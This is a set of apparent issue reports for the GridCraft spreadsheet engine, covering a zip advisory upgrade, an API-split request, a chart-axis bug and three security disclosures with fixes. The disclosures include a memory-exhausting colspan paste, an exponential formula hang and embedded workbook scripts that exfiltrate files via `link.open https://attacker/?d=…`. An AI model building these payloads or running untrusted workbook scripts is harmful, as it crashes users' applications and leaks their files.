## Summary

The workspace depends on `zip` 3, which is affected by three RustSec advisories: RUSTSEC-2026-0367, RUSTSEC-2026-0368 and RUSTSEC-2026-0369. They are fixed in `zip` 9. `cargo deny check advisories` (or `cargo audit`) on a project that depends on `gridcraft-xlsx` reports all three.

The XLSX, XLSB, ODS and encrypted-workbook readers open untrusted archives, so this is on the input path of every file a user opens.

## The change needed

We moved the domain crates to `zip = { version = "9.0.5", default-features = false, features = ["deflate"] }` and all of their tests pass. The only API change that reaches GridCraft is that an entry name is now a `Result`:

- `crates/xlsx/src/package.rs`, `Package::new`:

  ```rust
  match zip.name_for_index(i) {
      Some(Ok(n)) => {
          names.entry(normalize(&n)).or_insert(i);
      }
      Some(Err(e)) => return Err(IoError::Zip(e.to_string())),
      None => {}
  }
  ```

  A package whose entry name cannot be decoded is rejected with the archive error, rather than silently skipping the entry.

- six test files under `crates/xlsx/src/tests/` (`fixtures.rs`, `malformed.rs`, `passthrough_tests.rs`, `pivot_tests.rs`, `roundtrip.rs`, `trendline_roundtrip.rs`): `f.name()` becomes `f.name().unwrap()`.

We have not checked the crates we do not embed (`engine`, `ui-egui`, `chart`, `pdf`, `mcp`) for other uses.

Seen on tag `v0.9.0` (`a2cc4b42`) and on `main`.

## Summary

Please consider moving the document logic that currently lives in `gridcraft-engine` into the domain crates (or into a new crate without the application facade), so that an embedder can edit a workbook with GridCraft's semantics without taking the session, command, history and selection layer.

## Context

We embed GridCraft as the spreadsheet engine of another application: `core`, `formula`, `functions`, `numfmt`, `model`, `calc` and `xlsx`. Our application already owns the document session, undo history, selection and UI, so `engine` (and `ui-egui`) are not a fit, and we do not depend on them.

Reading works well with the domain crates alone. Editing does not, because several operations that change the document, not the UI, are implemented only inside `engine`, for example:

- structural edits in `crates/engine/src/cmd/sheet.rs`: inserting and deleting rows and columns (`insert_lines`, `delete_lines`), moving the sheet features that sit on those lines (`shift_sheet_features`) and rewriting every formula that refers to them (`rewrite_all_formulas`);
- conditional formatting (`crates/engine/src/cf.rs`);
- tables (`tables.rs`);
- fill series (`fill.rs`);
- PivotTables (`pivot.rs`, `pivot_calc.rs`);
- links (`links.rs`).

An embedder that wants "insert a row" today has to either depend on the whole facade or re-implement these rules, and a re-implementation is exactly how two engines end up disagreeing on the same file.

## What would help

- these operations as functions over `model::Workbook` (plus `calc` where they need it), returning what changed, with no session, command or history types in their signatures;
- `engine` calling them, so there is one implementation;
- the same `forbid(unsafe_code)` and no new dependencies, as the domain crates have today.

We are happy to test a branch against our use, and to help with the split if a direction is agreed.

## Summary

Clipboard HTML `colspan` expands to billions of cells — a web page can crash GridCraft with a single Ctrl+V.

**Location:** `crates/engine/src/clip_html.rs:84, 110`; reached through `edit.paste {text, html}` (`edit.rs:797`) and through system-clipboard HTML in the UI.

Each `<td colspan=N>` becomes up to 16,384 `HtmlCell`s; rows are unbounded. Only the *input* is capped (16 MB, `io.rs:290,349`); the expanded cell count isn't.

**Reproduced** — one `edit.paste` whose `html` is `<table>` plus 200,000 × `<tr><td colspan=16384>` (≈4.6 MB):
```
memory allocation of 655360 bytes failed
exit 127 after 25 s (system commit exhausted)
```

**Who triggers it:** any web page or app can put HTML on the clipboard; the victim only has to press Ctrl+V in GridCraft.

**Fix:**
```diff
+const MAX_HTML_CELLS: usize = 1_000_000;
+let mut budget = MAX_HTML_CELLS;
 for _ in 0..span {
+    if budget == 0 { return Err(too_large()); }
+    budget -= 1;
     row.push(cell.clone());
 }
```
Or clip the HTML grid to the TSV text's own row/column counts, which are already bounded.

## Summary

Workbook-embedded scripts run any command with no trust gate. A downloaded workbook can define a script that reads and writes user files or opens external links.

**Location:** `crates/engine/src/cmd/extra.rs:985-999`; stored in the hidden defined name `_sc_scripts` (`extra.rs:691`), which round-trips through XLSX:

```rust
for st in steps.iter().take(100_000) {
    let id = st["command"].as_str().unwrap_or("");
    if id.starts_with("automate.") { continue; }
    s.execute(id, st["params"].clone())?;
```

A downloaded workbook can define a script whose steps are `file.open` on a secret, `file.save` to a new path, `link.open https://attacker/?d=…`, and so on. The UI has no entry point to run scripts (`automate.runScript` not found in `ui-egui`); the trigger is a programmatic caller — an agent told by the workbook to "run the Refresh script", or `gridcraft-cli run --cmd automate.runScript=…`. Nothing marks scripts that came from a file as untrusted. GridCraft correctly never runs VBA (`extra.rs:979`); this is a GridCraft-native macro system without a matching safeguard.

**Fix:**
- Scripts loaded from a file are disabled until the user (or an explicit `"trusted": true` param) enables them.
- Inside `run_script`, refuse `file.*`, `data.getData`, `data.fromTextCsv`, `insert.picture` with a path, and `link.open`, or route them through `fs_root` (GC-10).

## Summary

Dependency extraction is exponential for range-operator chains — a sub-500-character formula hangs the app on open.

**Location:** `crates/calc/src/eval.rs:1775-1777`, inside `precedents()`'s `e.walk(...)`:

```rust
Expr::Binary(BinOp::Range, a, b) if !matches!((&**a, &**b), (Expr::Ref(_), Expr::Ref(_))) => {
    let mut inner = precedents(wb, sheet, a).0;
    inner.extend(precedents(wb, sheet, b).0);
```

For a Range node whose operands aren't both plain references, `precedents` recurses into `a` and `b`; then the enclosing `walk` *also* descends into them, and each re-enters the same arm. The range operator is left-associative, so a chain of k operands costs ~2^k. This runs in `Calc::rebuild` and `cells_changed` — i.e. on file open and every edit, on the UI thread.

**Reproduced** — `=SUM(INDEX(A1,1):INDEX(A1,1):…)` with k operands set into B1:

| k | length | time |
|---|---|---|
| 20 | 245 | 0.20 s |
| 22 | 269 | 0.62 s |
| 24 | 293 | 2.6 s |
| 26 | 317 | 9.1 s |
| 28 | 341 | 39.8 s |

Time grows ~4× per 2 operands. About 40 operands (under 500 characters, well inside the 8,192 formula limit) would take days — a file holding it hangs the app on open.

**Fix:** don't let `walk` descend into a Range node that has already been handled — a hand-written recursive collector that returns at Range nodes:
```diff
-    e.walk(&mut |n| match n { ... Expr::Binary(BinOp::Range, a, b) ... => { precedents(a); precedents(b); ... } })
+    fn collect(n: &Expr, depth: u32, out: &mut Vec<Area>, dynamic: &mut bool) {
+        if depth > MAX_DEPTH { *dynamic = true; return; }
+        match n {
+            Expr::Binary(BinOp::Range, a, b) => { /* collect a, b once; push bounding box; DON'T fall through */ }
+            other => for child in other.children() { collect(child, depth + 1, out, dynamic) },
+        }
+    }
```

**Regression test** (time-bounded): `precedents` of a 60-operand chain must finish in under 100 ms.

When a chart's categories are in reverse order (#1687), Excel moves the value axis to the opposite side: to the **top** of a bar chart, and to the **right** of a column or combo chart. That's because the value axis crosses the category axis at the first category ("Horizontal axis crosses: Automatic"), which is now at the far end. GridCraft draws the value axis at the bottom (bar) or left (column) whatever the order. That's true on `main`, and on #1895, which adds reverse order.

Checked black-box in Excel (Windows, Microsoft 365) with synthetic workbooks that only set `c:orientation val="maxMin"` on the category axis (`c:crosses` left at `autoZero`). A reversed stacked bar chart shows its value labels above the plot, and a reversed clustered column chart and a reversed column + line combo show them on the right. The same bar chart not reversed shows them at the bottom. Format Axis shows *Categories in reverse order* ticked and *Horizontal axis crosses: Automatic*.

The crossing point is a setting of its own. Format Axis ▸ *Horizontal axis crosses*: *Automatic*, *At category number n*, *At maximum category*. With *At maximum category* on a reversed axis, the value axis should stay at the bottom; that case hasn't been checked in Excel yet. In the file this is `c:crosses` (`autoZero`, `min`, `max`) or `c:crossesAt` on the axis. GridCraft writes `autoZero` (`max` for the secondary value axis) and reads neither. A reversed value axis (#1895's `val_reverse`) presumably moves the category axis in the same way; also unchecked.

Likely shape:
- model the crossing point (automatic / category number / maximum, and the value-axis equivalent);
- read and write `c:crosses` / `c:crossesAt`;
- in `chart/src/render.rs::frame`, draw each axis's labels on the side where it crosses: the far side when the other axis is reversed and crossing is automatic, the near side for *At maximum category* on a reversed axis;
- a Format pane control and a `chart.set` param.

